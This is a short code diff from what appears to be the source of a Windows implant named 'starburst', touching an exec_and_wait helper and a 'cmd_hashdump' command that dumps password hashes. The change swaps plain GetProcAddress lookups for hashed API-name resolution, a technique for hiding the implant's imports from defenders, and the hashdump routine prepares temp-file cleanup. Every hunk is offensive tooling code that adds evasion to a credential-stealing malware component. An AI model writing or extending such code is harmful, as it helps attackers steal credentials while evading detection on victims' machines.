@@ -69,9 +69,9 @@ static auto declfn exec_and_wait(
     // GetExitCodeProcess is available via GetProcAddress
     typedef BOOL (WINAPI *fn_GetExitCodeProcess)( HANDLE, LPDWORD );
     auto pGetExitCodeProcess = reinterpret_cast<fn_GetExitCodeProcess>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "GetExitCodeProcess" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "GetExitCodeProcess" ) ) );
     if ( pGetExitCodeProcess )
         pGetExitCodeProcess( pi.hProcess, &exit_code );
 
@@ -89,9 +89,9 @@ auto declfn starburst::cmd_hashdump(
 
     // resolve GetTempPathA from kernel32
     auto pGetTempPathA = reinterpret_cast<fn_GetTempPathA>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "GetTempPathA" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "GetTempPathA" ) ) );
     if ( !pGetTempPathA ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetTempPathA not found" ) ) );
@@ -100,9 +100,9 @@ auto declfn starburst::cmd_hashdump(
 
     // resolve DeleteFileA for cleanup
     auto pDeleteFileA = reinterpret_cast<fn_DeleteFileA>(
-        inst.kernel32.GetProcAddress(
-            (HMODULE)inst.kernel32.handle,
-            symbol<LPCSTR>( "DeleteFileA" ) ) );
+        resolve::_api(
+            reinterpret_cast<uintptr_t>( (HMODULE)inst.kernel32.handle ),
+            expr::hash_string( "DeleteFileA" ) ) );
 
     // get temp directory
     char temp_dir[260] = { 0 };
